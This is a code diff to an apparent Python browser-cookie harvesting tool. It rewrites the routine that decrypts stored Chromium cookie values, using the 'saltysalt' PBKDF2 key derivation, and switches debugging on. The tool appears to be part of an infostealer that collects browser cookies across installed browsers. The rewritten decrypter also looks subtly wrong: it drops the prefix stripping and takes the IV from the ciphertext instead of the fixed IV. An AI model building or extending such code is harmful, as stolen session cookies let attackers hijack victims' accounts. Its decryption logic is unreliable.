@@ -16,8 +16,10 @@ import sqlite3
 import string
 import sys
 import tempfile
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
 
-DEBUG = False
+DEBUG = True
 
 # Yellow color
 def print_debug(text):
@@ -94,40 +96,28 @@ class Broswer:
                 self.cookies_path.append({browser_name: cookies_data})
 
     def decrypter(self, cipher_text, key):
-        # Print debug information
-        # print_debug(f"[+] decrypting {cipher_text} and  key is {key}")
-
         try:
-            # Decode the base64 encoded cipher text
-            cipher_text_encoded = base64.b64decode(cipher_text[3:])
+            # Decode the base64 encoded ciphertext
+            cipher_text_decoded = base64.b64decode(cipher_text)
 
-            # Correctly define the IV as a 16-byte value in hexadecimal
-            iv = '20202020202020202020202020202020'  # Adjust this according to your encryption setup
+            # Extract IV from the beginning of the decoded ciphertext
+            iv = cipher_text_decoded[:16]
+            encrypted_data = cipher_text_decoded[16:]
 
-            # Derive the key using PBKDF2 HMAC SHA1
-            key = key.encode("utf-8")
-            derived_key = hashlib.pbkdf2_hmac('sha1', key, b'saltysalt', 1003)[:16]
-            hex_key = binascii.hexlify(derived_key).decode('utf-8')
+            # Derive the key using PBKDF2
+            key = hashlib.pbkdf2_hmac('sha1', key.encode('utf-8'), b'saltysalt', 1003)[:16]
 
-            # Construct the OpenSSL command
-            cmd = [
-                "openssl", "enc", "-d", "-aes-128-cbc",
-                "-base64", "-iv", iv, "-K", hex_key
-            ]
+            # Set up AES decryption
+            cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
+            decryptor = cipher.decryptor()
 
-            # Use subprocess to execute the command
-            process = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            output, error = process.communicate(input=cipher_text_encoded)
+            # Decrypt the data
+            decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
 
-            if process.returncode != 0:
-                print(f"[-] Error running the openssl command: {error.decode('utf-8')}")
-                return cipher_text
-
-            return output.strip()
-
+            return decrypted_data
         except Exception as e:
-            print(f"[-] Exception occurred: {e}")
-            return cipher_text
+            print(f"[-] Error during decryption: {e}")
+            return None
 
               
     def browse_browser_db(self, browser_data_paths, query_type): 
